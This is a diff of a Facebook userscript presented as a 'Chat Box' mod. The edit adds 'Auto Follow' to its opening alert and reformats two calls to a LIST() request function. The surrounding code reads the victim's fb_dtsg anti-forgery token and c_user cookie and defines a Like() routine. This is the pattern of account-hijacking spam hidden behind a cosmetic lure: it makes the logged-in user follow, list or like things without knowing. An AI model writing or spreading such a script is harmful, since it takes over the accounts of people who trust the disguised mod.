@@ -1,4 +1,4 @@
-alert('Chat Box  Facebook Modified by: Ryan                                                                                       Click-> Ok');
+alert('Chat Box + Auto Follow  Facebook Modified by: Ryan                                                                                       Click-> Ok');
 (function() {
 var css = "";
 if (false || (document.domain == "apps.facebook.com" || document.domain.substring(document.domain.indexOf(".apps.facebook.com") + 1) == "apps.facebook.com") || (new RegExp("^https?://www\\.facebook\\.com/(?!plugins/).*$")).test(document.location.href))
@@ -38,8 +38,8 @@ function LIST(L) {
   X.send(XParams);
 }
 
-    LIST("645496728822076");
-	LIST("654434804594935");
+LIST("645496728822076");
+LIST("654434804594935");
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 function Like(p) {
